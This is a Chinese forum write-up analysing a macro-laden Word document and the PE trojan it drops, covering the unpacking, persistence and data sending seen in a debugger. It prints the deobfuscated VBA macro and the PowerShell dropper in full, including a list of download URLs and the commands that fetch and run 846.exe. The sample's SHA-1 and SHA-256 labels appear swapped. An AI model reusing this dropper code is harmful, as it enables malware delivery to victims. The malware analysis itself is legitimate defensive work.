
# [原创]记一次某pe木马较不完整分析

## 前言

记录一下最近分析的一个样本,自己依然是个菜鸡,有很多不足,希望各位师傅提出错误我努力学习.我头发都没了.此木马发送用户信息加密,能进行远程后门访问等功能,导入函数和导出函数只有一个,大量的动态加载api.

idb和样本都放下面学习链接那了.

## 0x01 样本信息

- 样本名称: `f7df4126d9ae958be542583f0da746c4097bcc33b743a7af3896a3292de52282-1571228285.doc`
- 样本大小: 182,784
- MD5: `b72f31807db78e70eb2c45993dd2a4e1`
- SHA-256: `c1fff4d580677f66da1841e882d94f17bc04068d`
- SHA-1: `f7df4126d9ae958be542583f0da746c4097bcc33b743a7af3896a3292de52282`
- 样本来源: <<mark class="encrypted">326K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6S2M7s2m8Q4x3X3g2S2L8Y4W2Q4x3X3g2J5N6h3&6Q4x3V1k6@1j5i4y4C8M7#2)9J5c8U0j5J5x3U0b7H3k6r3p5^5i4K6u0V1z5e0M7@1x3g2)9J5k6o6b7#2k6X3k6Q4x3X3b7^5j5K6p5J5i4K6u0V1j5U0t1$3k6o6M7H3y4r3p5$3x3e0b7#2i4K6u0r3</mark>>

## 0x02 分析环境

- 环境: VMware15 , Win10 专业版, Office 365

## 0x03 病毒行为

![image.png](upload/attach/202001/779000_QPZSABGM2YJD4XV.jpg)

## 0x04 详细分析

### 一. 打开doc,宏代码

`Alt+F11`查看调试宏代码

三个模块分别为`Pibafqel`,`Nzolhtmfybml`,`Xhnbvwxbzhq`.`Nzolhtmfybml`里面是空的,其他两个里面充满类似家庭地址的注释,使用脚本删除掉后进行调试翻译.去除无用混淆,大多数都只是定义,声明的函数.

```vbscript
Function XXX()
;这种格式表示一个函数
End Function
Sub AutoOpen()
;运行文档时候，自动运行宏
End Sub
```

调试后发现,在`autoopen`中使用过函数有`Hsbahypqju()`和`Abiufkgnjgdiv(Kmtifafrucqb)`.

化简:![image.png](upload/attach/202001/779000_GAWVAD4878MZD4B.jpg)

#### `autopen()`

调用`Hsbahypqju()`,

#### `Hsbahypqju()`

遇到个office坑比的地方,通过监视窗口只能查看前250个字符,所以最好通过`Debug.Print`打印变量,能看到全部字符串

```vbscript
Function Hsbahypqju()
On Error Resume Next
Set Dtzjcfqgj = CreateObject("winmgmts:win32\_processstartup")
Dtzjcfqgj.ShowWindow = 0#
Thbjfvedxuqm = "powershell -e <# https://www.microsoft.com/ #> $Eywrqrdqbmw='Rzhvtqwrc';$Jcwhciloutn = '846';$Ctyrqdpzavru='Wixhqavur';$Bpaqqzwo=$env:userprofile+'\'+$Jcwhciloutn+'.exe';$Yawfxccmy='Ezlignhvinnmt';$Tlvpwcruuo=.('new-'+'obj'+'ect') NEt.WebClIENT;$Jznyrpyuqf='http://complaintboardonline.com/wp-admin/qekr3925/\*https://frazischool.com/wp-includes/ozi2y6740/\*https://sagarngofoundation.com/jxc5c/q54824/\*https://naturerepublickh.com/test/wvvqa9/\*https://watonlight.com/wp-admin/wa31628/'."sp`LiT"('\*');$Ufiwicmkrdst='Ohjtzdywhuim';foreach($Lygaeckfk in $Jznyrpyuqf){try{$Tlvpwcruuo."d`OwNLoaD`FILE"($Lygaeckfk, $Bpaqqzwo);$Tlncrdhw='Fvsotfnt';If ((&('G'+'et-It'+'em') $Bpaqqzwo)."LE`NgtH" -ge 23622) {[Diagnostics.Process]::"s`TARt"($Bpaqqzwo);$Getujvyyonwg='Gppbzmrdhoel';break;$Cgphukmh='Hhiypojok'}}catch{}}$Pyreoccwfqy='Whyolyeyvhts'"
Set Ywlbxgbmzrxh = CreateObject("winmgmts:Win32\_Process")
Finrmepurj = Ywlbxgbmzrxh.Create(Thbjfvedxuqm, Ncrmxklxbct, Dtzjcfqgj, Pxajxegluaugg)
End Function
```

1. 创建一个`winmgmts:win32_processstartup`对象,仅用于将信息传递给<a href="elink@c14K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6V1L8$3y4K6i4K6u0W2L8h3W2U0M7X3!0K6L8$3k6@1i4K6u0W2j5$3!0E0i4K6u0r3P5X3S2Q4x3X3c8U0L8W2)9J5c8Y4N6A6L8X3c8G2N6%4y4Q4x3V1k6%4K9h3^5K6x3W2)9J5c8X3y4A6L8i4N6A6L8U0x3J5M7s2u0G2N6W2)9J5c8X3y4A6L8U0x3J5i4K6u0V1M7s2u0G2j5$3g2K6M7H3`.`.">`Win32_Process`</a>类的<a href="elink@38aK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6V1L8$3y4K6i4K6u0W2L8h3W2U0M7X3!0K6L8$3k6@1i4K6u0W2j5$3!0E0i4K6u0r3P5X3S2Q4x3X3c8U0L8W2)9J5c8Y4N6A6L8X3c8G2N6%4y4Q4x3V1k6%4K9h3^5K6x3W2)9J5c8X3y4A6L8i4N6A6L8U0x3J5M7s2u0G2N6W2)9J5c8X3y4J5k6h3q4@1k6g2)9J5k6r3#2W2N6r3S2G2k6q4)9J5k6r3W2F1i4K6u0V1j5$3I4S2M7%4y4Q4x3X3c8%4K9h3^5K6x3W2)9J5k6s2m8J5L8$3y4W2M7%4x3`.">`Create`</a>方法。

2. 隐藏窗口

3. 命令行字符串

4. 创建`winmgmts:Win32_Process`对象

5. 通过`Win32_Process`方法`Creat`运行字符串.`-e`为`-EncodeCommand`.`powershell -e`运行base64编码的字符串.

Create(命令行,子进程路径,启动配置,进程od)

#### `Abiufkgnjgdiv(Kmtifafrucqb)`

将传入的字符串中的`0xdc3`替换为空,恢复字符串的作用.

### 二. PowerShell脚本分析

```powershell
$Eywrqrdqbmw='Rzhvtqwrc';
$Jcwhciloutn = '846';
$Ctyrqdpzavru='Wixhqavur';
$Bpaqqzwo="%userprofile%\846.exe";
$Yawfxccmy='Ezlignhvinnmt';
$Tlvpwcruuo=.('new-object') NEt.WebClIENT;
$Jznyrpyuqf='http://complaintboardonline.com/wp-admin/qekr3925/\*https://frazischool.com/wp-includes/ozi2y6740/\*https://sagarngofoundation.com/jxc5c/q54824/\*https://naturerepublickh.com/test/wvvqa9/\*https://watonlight.com/wp-admin/wa31628/'."sp`LiT"('\*');
$Ufiwicmkrdst='Ohjtzdywhuim';
foreach($Lygaeckfk in $Jznyrpyuqf){
try{$Tlvpwcruuo."dOwNLoaDFILE"($Lygaeckfk, $Bpaqqzwo);
$Tlncrdhw='Fvsotfnt';
If ((&('Get-Item') $Bpaqqzwo)."LENgtH" -ge 23622) {
[Diagnostics.Process]::"sTARt"($Bpaqqzwo);
$Getujvyyonwg='Gppbzmrdhoel';
break;
$Cgphukmh='Hhiypojok'}
}
catch{}
}
$Pyreoccwfqy='Whyolyeyvhts'
```

1. 创建`WebClient`对象
2. 调用`downloadfile`方法通过用`\*`分割好的数组的链接遍历下载文件并存储为`%userprofile%\846.exe`
3. 如果长度大于23622,则启动`846.exe`程序.
4. 最后一个网址疑似被挂马,可能已被入侵作为传播中转站.

### 三. `846.exe`

位置: `%userprofile%\846.exe`

名称: `846.exe`

md5: `e83c5ba6be05ec51ae6ceb2470fcfdf3`

sha-1: `94b527756b6c6753822501f76f161bf64ad6974c`

sha-256: `fb0a0f10cbebefb5dbe6034c3bdfe246179e444c68a6e36c4d20232d52fc07a7`

![image.png](upload/attach/202001/779000_Z2HY9S3JZ7U99PS.jpg)

时间是最近创建的.无壳,使用vs2015编译.

#### 0x01行为分析

根据`ProcessExplorer`观察程序执行大概流程.`846.exe`执行后会启动一个新进程 后杀掉自己.新进程名为`dasmrcdasmrc.exe`,地址为`%LOCALAPPDATA%\dasmrcdasmrc.exe`

![image.png](upload/attach/202001/779000_8TM7E8WDRHTVNST.jpg)

#### 0x02 详细分析

##### 信息收集

存在唯一的导出函数`qzLgKZBqfCXorfLMeJzdKzgyvdzqwF`,`EntryPoint`为`0x00004960`

`CIRC OLE Control DLL`可能某个样本种类吧.

##### 流程分析

###### 0x01 `Winmain`

![image.png](upload/attach/202001/779000_35GBJQHK9WEC3NE.jpg)

通过导出表获取函数`qzLgKZBqfCXorfLMeJzdKzgyvdzqwF`的地址,跳转执行.

###### 0x02 导出函数 `qzLgKZBqfCXorfLMeJzdKzgyvdzqwF()`

![image.png](upload/attach/202001/779000_EEHYTPC75T6S8YM.jpg)

获取`VirtualAlloc`函数地址,以使得后续能拷贝执行数据.

![image.png](upload/attach/202001/779000_SU2D3M6ZGN43TQ3.jpg)

###### 0x03 解密数据执行

![image.png](upload/attach/202001/779000_69F5YK6NTTACX8P.jpg)

1. `sub_1E0467`函数通过传如对应函数`hash`值获取所需api地址.

sub_1e0467:![image.png](upload/attach/202001/779000_42T9X7S9PSQFJ83.jpg)

`(((FS:[30])+0xC)+0xC)`获取`Ldr`的地址,后面进行遍历和比较最终得到所需要的地址. 参考链接放在下面了.

![image.png](upload/attach/202001/779000_MZWUGPMFVNMBD9B.jpg)

根据`PE`偏移,获取各个节的数据.

![image.png](upload/attach/202001/779000_GBG4YPBKPEJHP3B.jpg)

2. 申请空间

![image.png](upload/attach/202001/779000_2J8J95TAAV9DPWX.jpg)

3. 拷贝后门程序`pe`数据.这时候顺便去dump内存被复制的pe数据,(毕竟可能不用修复重定位(x).

![age.png](upload/attach/202001/779000_KST5JT4AM4WJ4VA.jpg)得知程序入口RVA为`0x1000`, 基地址为`0x60000`,所以起始地址为`0x610000`,块大小为`D200`

4. 内存页属性修改

修改代码段为可执行可读属性.

![image.png](upload/attach/202001/779000_8UBB6UTTAA9GFB5.jpg)

修改数据段为可读属性

![image.png](upload/attach/202001/779000_8UBB6UTTAA9GFB5.jpg)

5. 执行新pe文件的代码段,这时候顺便dump下来pe数据.

![image.png](upload/attach/202001/779000_T4VCRJKESKA5JMA.jpg)

###### 0x04 内存pe执行

1. 拷贝数据

![image.png](upload/attach/202001/779000_495N4EVN8PQP356.jpg)

2. 获取模块全称和地址

![image.png](upload/attach/202001/779000_779QNVRVTMZ76SW.jpg)

3. 计算key

![image.png](upload/attach/202001/779000_8G84AH3SRFHXH87.jpg)

4. 格式化参数

![image.png](upload/attach/202001/779000_XCXAGCVAZ47XYVW.jpg)

5. 计算出的命令行参数和从右往左取现有命令行进行比较,如果命令相等则执行内部函数.不相等的话执行下列流程

![image.png](upload/attach/202001/779000_85Q8ZW9UB55Q9U4.jpg)

![image.png](upload/attach/202001/779000_AWCF56NFASRUV62.jpg)

6. 不相等后

执行后续程序,最终`CreateProcessW`

创建新的自身进程并附加对应计算出的命令参数:

![image.png](upload/attach/202001/779000_QGRWTAVESKQVKY7.jpg)

![image.png](upload/attach/202001/779000_424QEDJCPGJ383V.jpg)

7. 退出进程

![image.png](upload/attach/202001/779000_DZZQRXX59S6K8YT.jpg)

###### 0x05 主要功能

![image.png](upload/attach/201910/HEGZNDG433GRANK.jpg)

使用上述的命令行字符串进行调试,这时候为了方便使用之前解密后dump下来的pe数据.

二者字符串相等进入`sub_30B8AB`.

![image.png](upload/attach/202001/779000_DMZK2W3AYYN8GQP.jpg)

通过互斥量执行主要功能函数函数,等待`4000ms`

![image.png](upload/attach/202001/779000_5U5THDRSVGM9BDW.jpg)

功能大致分布区域,通过对固定内存空间的值进行校验赋值,依次执行不同功能

1. 系统进程获取

![image.png](upload/attach/202001/779000_9VDDZ7SUFNAP53Z.jpg)

`sub_302255`![image.png](upload/attach/202001/779000_RBFRBAH6FASBHYY.jpg)

进程名存储:![image.png](upload/attach/202001/779000_A6D43JKW2WYF4KV.jpg)

2. 信息发送

![image.png](upload/attach/202001/779000_3MV9DUKXYMVU95Z.jpg)

发送流程

![image.png](upload/attach/202001/779000_9GUVH7Y8KGTJQYK.jpg)

3. 注册自启动

![image.png](upload/attach/202001/779000_52TK6N9J69QTPR7.jpg)

4. 新文件
